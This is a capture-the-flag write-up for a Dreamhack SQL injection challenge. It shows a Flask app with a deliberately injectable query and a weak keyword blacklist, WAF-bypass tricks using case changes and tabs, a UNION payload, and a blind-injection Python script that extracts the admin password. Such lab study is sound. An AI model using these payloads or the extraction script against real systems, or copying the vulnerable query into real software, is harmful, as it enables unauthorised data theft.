---
title: sql injection bypass WAF
author: thanguyen165
date: 2023-01-01 07:00:00 +0700
categories: [Practice, dreamhack]
tags: [Web Exploitation, dreamhack]
---

* Level: 1
* Link: [https://dreamhack.io/wargame/challenges/415/](https://dreamhack.io/wargame/challenges/415/)

## Description

> This is the problem that you practice in the SQL Injection Bypass WAF.

### Attached

```sql
CREATE DATABASE IF NOT EXISTS `users`;
GRANT ALL PRIVILEGES ON users.* TO 'dbuser'@'localhost' IDENTIFIED BY 'dbpass';

USE `users`;
CREATE TABLE user(
  idx int auto_increment primary key,
  uid varchar(128) not null,
  upw varchar(128) not null
);

INSERT INTO user(uid, upw) values('abcde', '12345');
INSERT INTO user(uid, upw) values('admin', 'DH{**FLAG**}');
INSERT INTO user(uid, upw) values('guest', 'guest');
INSERT INTO user(uid, upw) values('test', 'test');
INSERT INTO user(uid, upw) values('dream', 'hack');
FLUSH PRIVILEGES;
```
{: file="./init.sql" }

```py
import os
from flask import Flask, request
from flask_mysqldb import MySQL

app = Flask(__name__)
app.config['MYSQL_HOST'] = os.environ.get('MYSQL_HOST', 'localhost')
app.config['MYSQL_USER'] = os.environ.get('MYSQL_USER', 'user')
app.config['MYSQL_PASSWORD'] = os.environ.get('MYSQL_PASSWORD', 'pass')
app.config['MYSQL_DB'] = os.environ.get('MYSQL_DB', 'users')
mysql = MySQL(app)

template ='''
<pre style="font-size:200%">SELECT * FROM user WHERE uid='{uid}';</pre><hr/>
<pre>{result}</pre><hr/>
<form>
    <input tyupe='text' name='uid' placeholder='uid'>
    <input type='submit' value='submit'>
</form>
'''

keywords = ['union', 'select', 'from', 'and', 'or', 'admin', ' ', '*', '/']
def check_WAF(data):
    for keyword in keywords:
        if keyword in data:
            return True

    return False


@app.route('/', methods=['POST', 'GET'])
def index():
    uid = request.args.get('uid')
    if uid:
        if check_WAF(uid):
            return 'your request has been blocked by WAF.'
        cur = mysql.connection.cursor()
        cur.execute(f"SELECT * FROM user WHERE uid='{uid}';")
        result = cur.fetchone()
        if result:
            return template.format(uid=uid, result=result[1])
        else:
            return template.format(uid=uid, result='')

    else:
        return template


if __name__ == '__main__':
    app.run(host='0.0.0.0')

```
{: file="./app.py" }

## Analyzation

The ```user``` table has 3 columns: ```idx```, ```uid``` and ```upw```.

```sql
CREATE TABLE user(
  idx int auto_increment primary key,
  uid varchar(128) not null,
  upw varchar(128) not null
);
```

And flag is admin's password
```sql
INSERT INTO user(uid, upw) values('admin', 'DH{**FLAG**}');
```

Our target is to get admin's password.

Check [```check_WAF()```](https://www.cloudflare.com/learning/ddos/glossary/web-application-firewall-waf/) function

```py
keywords = ['union', 'select', 'from', 'and', 'or', 'admin', ' ', '*', '/']
def check_WAF(data):
    for keyword in keywords:
        if keyword in data:
            return True

    return False
```

So the ```keywords``` array is blacklist
```py
if check_WAF(uid):
    return 'your request has been blocked by WAF.'
```

Check ```index()``` function

```py
@app.route('/', methods=['POST', 'GET'])
def index():
    uid = request.args.get('uid')
    if uid:
        if check_WAF(uid):
            return 'your request has been blocked by WAF.'
        cur = mysql.connection.cursor()
        cur.execute(f"SELECT * FROM user WHERE uid='{uid}';")
        result = cur.fetchone()
        if result:
            return template.format(uid=uid, result=result[1])
        else:
            return template.format(uid=uid, result='')

    else:
        return template
```

- After the ```uid``` is get by ```GET``` method, it will be checked by ```check_WAF(uid)```.

- Then the server will send query to sql database, and send back result: ```cur.execute(f"SELECT * FROM user WHERE uid='{uid}';")```

- If result exists, the template will show one ```uid``` only (```result[0]``` is ```idx```, ```result[1]``` is ```uid```, ```result[2]``` is ```upw``` ). Else empty string will be displayed.

WAF blocks ```"union"```, ```"select```, but ```"Union"```, ```"Select"``` can be used to bypass the WAF.

If ```"admin"``` is blocked, a function can be used, like ```reverse(\"nimda\")```, or ```concat('admi','n')```, or simply ```"Admin"```.

The WAF only blocks space ```%20```. It does not block tab ```%09```, so it can be used. (See [ascii table](https://www.asciitable.com/)).

## Solution 1: [SQLI UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks)

Original query
```sql
SELECT * FROM user WHERE uid='{uid}';
```

If we make a payload, as usual
```
'	Union	Select	1,upw,3	From	user	Where	uid='Admin
```

Then the query now will be
```sql
SELECT * FROM user WHERE uid=''	Union	Select	1,upw,3	From	user	Where	uid='Admin';
```

And we get the flag
```
DH{bc818d522986e71f9b10afd732aef9789a6db76d}
```

## Solution 2: Blind sqli by error-based

After getting password, we can check its character, one by one by

```sql
SELECT * FROM user WHERE uid='admin' && if(ascii(substr(upw, 1, 1)) = 124, true, false)#;
```

- If the ```if``` statement is true, the query will return admin, and login successfully.

```py
import requests

URL = "http://host3.dreamhack.games:16703/?uid='||uid%3Dreverse(\"nimda\")%26%26if(ascii(substr(upw%2C{}%2C1))%3D{}%2Ctrue%2Cfalse)%23"

flag = ""

for i in range(1, 50):
    for j in range(32, 129):
        response = requests.get(URL.format(i, j))
        print(chr(j))
        if 'admin' in response.text:
            flag += chr(j)
            print(f"----flag: {flag}")
            if flag[-1] == '}':
                exit()
            break

```

The flag is
```
DH{bc818d522986e71f9b10afd732aef9789a6db76d}
```